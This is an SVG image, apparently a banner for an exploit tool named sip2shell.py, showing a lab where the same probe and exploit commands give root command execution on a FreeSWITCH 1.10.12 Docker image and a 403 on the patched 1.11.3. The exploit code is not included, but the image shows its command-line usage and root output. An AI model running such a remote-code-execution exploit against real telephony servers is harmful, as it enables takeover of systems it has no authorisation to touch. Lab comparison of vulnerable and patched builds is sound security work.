<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 400" width="1200" height="400" role="img" aria-labelledby="ltitle ldesc">
  <title id="ltitle">SIP2Shell A/B lab: FreeSWITCH 1.10.12 returns root, 1.11.3 returns 403</title>
  <desc id="ldesc">Two terminal panels show the same probe and exploit against the vulnerable and patched Docker images.</desc>
  <defs>
    <linearGradient id="lbg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0" stop-color="#070607"/>
      <stop offset=".5" stop-color="#090708"/>
      <stop offset="1" stop-color="#120607"/>
    </linearGradient>
    <pattern id="lgrid" width="30" height="30" patternUnits="userSpaceOnUse">
      <path d="M30 0 L0 0 0 30" fill="none" stroke="#d41414" stroke-opacity=".05"/>
    </pattern>
    <style>
      .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; }
      .kicker { font-size: 10.5px; letter-spacing: 2.2px; fill: #8a7a66; }
      .tag { font-size: 10px; font-weight: 800; letter-spacing: 1.8px; }
      .t { font-size: 12px; letter-spacing: .15px; }
      .dim { fill: #8a7a66; }
      .bone { fill: #e7d8bd; }
      .red { fill: #ff5a5a; }
      .green { fill: #8ef07a; }
      .teal { fill: #35d0c0; }
      .foot { font-size: 10.5px; letter-spacing: 1px; fill: #7d7062; }
      .pulse { animation: lp 3.4s ease-in-out infinite; }
      .blink { animation: lb 1.15s steps(1) infinite; }
      @keyframes lp { 0%,100% { opacity:.55; } 50% { opacity:1; } }
      @keyframes lb { 0%,49% { opacity:1; } 50%,100% { opacity:.12; } }
      @media (prefers-reduced-motion: reduce) { .pulse,.blink { animation: none; } }
    </style>
  </defs>

  <rect width="1200" height="400" fill="url(#lbg)"/>
  <rect width="1200" height="400" fill="url(#lgrid)"/>

  <text x="40" y="36" class="mono kicker" fill="#8a7a66">REAL LAB / A-B</text>
  <text x="1160" y="36" text-anchor="end" class="mono kicker" fill="#8a7a66">DOCKER IMAGES / NO MOCK</text>

  <!-- left panel -->
  <g transform="translate(40 58)">
    <rect width="530" height="252" rx="9" fill="#080607" stroke="#d41414" stroke-opacity=".3"/>
    <path d="M0 34 H530" stroke="#d41414" stroke-opacity=".2"/>
    <circle cx="20" cy="17" r="3.4" fill="#d41414" fill-opacity=".9" class="pulse"/>
    <circle cx="34" cy="17" r="3.4" fill="#f0b45a" fill-opacity=".55"/>
    <circle cx="48" cy="17" r="3.4" fill="#35d0c0" fill-opacity=".55"/>
    <text x="66" y="21" class="mono t dim" fill="#8a7a66">safarov/freeswitch:1.10.12</text>
    <text x="510" y="21" text-anchor="end" class="mono tag red" fill="#ff5a5a">VULNERABLE</text>

    <text x="20" y="62" class="mono t bone" fill="#e7d8bd">$ python3 sip2shell.py probe -t 10.0.0.5</text>
    <text x="20" y="84" class="mono t red" fill="#ff5a5a">  VULN  vulnerable v1.10.12</text>

    <text x="20" y="122" class="mono t bone" fill="#e7d8bd">$ python3 sip2shell.py exploit -t 10.0.0.5 -c id</text>
    <text x="20" y="144" class="mono t dim" fill="#8a7a66">[*] target 10.0.0.5:5060</text>
    <text x="20" y="166" class="mono t green" fill="#8ef07a">uid=0(root) gid=0(root) groups=0(root)</text>
    <text x="20" y="188" class="mono t dim" fill="#8a7a66">host: kali</text>
    <text x="20" y="222" class="mono t dim" fill="#8a7a66">read-back or OOB, same command</text>
  </g>

  <!-- centre divider -->
  <g transform="translate(600 58)">
    <path d="M0 0 V92" stroke="#d41414" stroke-opacity=".28" stroke-dasharray="3 6"/>
    <path d="M0 252 V160" stroke="#d41414" stroke-opacity=".28" stroke-dasharray="3 6"/>
    <text x="0" y="104" text-anchor="middle" class="mono kicker" fill="#d41414">SAME</text>
    <text x="0" y="158" text-anchor="middle" class="mono kicker" fill="#d41414">PACKET</text>
  </g>
  <path d="M600 175 L609 184 L600 193 L591 184 Z" fill="#070607" stroke="#d41414" stroke-opacity=".8"/>
  <path d="M600 181 L603 184 L600 187 L597 184 Z" fill="#f0e2c8" fill-opacity=".7"/>

  <!-- right panel -->
  <g transform="translate(630 58)">
    <rect width="530" height="252" rx="9" fill="#070a0a" stroke="#35d0c0" stroke-opacity=".28"/>
    <path d="M0 34 H530" stroke="#35d0c0" stroke-opacity=".16"/>
    <circle cx="20" cy="17" r="3.4" fill="#35d0c0" fill-opacity=".8" class="pulse"/>
    <circle cx="34" cy="17" r="3.4" fill="#f0b45a" fill-opacity=".55"/>
    <circle cx="48" cy="17" r="3.4" fill="#d41414" fill-opacity=".55"/>
    <text x="66" y="21" class="mono t dim" fill="#8a7a66">safarov/freeswitch:1.11.3</text>
    <text x="510" y="21" text-anchor="end" class="mono tag teal" fill="#35d0c0">PATCHED</text>

    <text x="20" y="62" class="mono t bone" fill="#e7d8bd">$ python3 sip2shell.py probe -t 10.0.0.5</text>
    <text x="20" y="84" class="mono t teal" fill="#35d0c0">  PATCHED  403 api proto refused</text>

    <text x="20" y="122" class="mono t bone" fill="#e7d8bd">$ python3 sip2shell.py exploit -t 10.0.0.5 -c id</text>
    <text x="20" y="144" class="mono t dim" fill="#8a7a66">[*] target 10.0.0.5:5060</text>
    <text x="20" y="166" class="mono t teal" fill="#35d0c0">403 Forbidden  enable-chat-api-proto</text>
    <text x="20" y="188" class="mono t dim" fill="#8a7a66">no command executed</text>
    <text x="20" y="222" class="mono t dim" fill="#8a7a66">the gate is off by default in 1.11.3+</text>
  </g>

  <!-- footer band -->
  <g transform="translate(40 332)">
    <rect width="1120" height="44" rx="8" fill="#d41414" fill-opacity=".04" stroke="#d41414" stroke-opacity=".18"/>
    <text x="20" y="27" class="mono foot" fill="#ff5a5a">1.10.12 -&gt; uid=0</text>
    <text x="200" y="27" class="mono foot" fill="#35d0c0">1.11.3 -&gt; 403</text>
    <text x="360" y="27" class="mono foot" fill="#7d7062">same packet, same command, different build</text>
    <text x="1100" y="27" text-anchor="end" class="mono foot" fill="#7d7062">docker compose up</text>
  </g>
</svg>
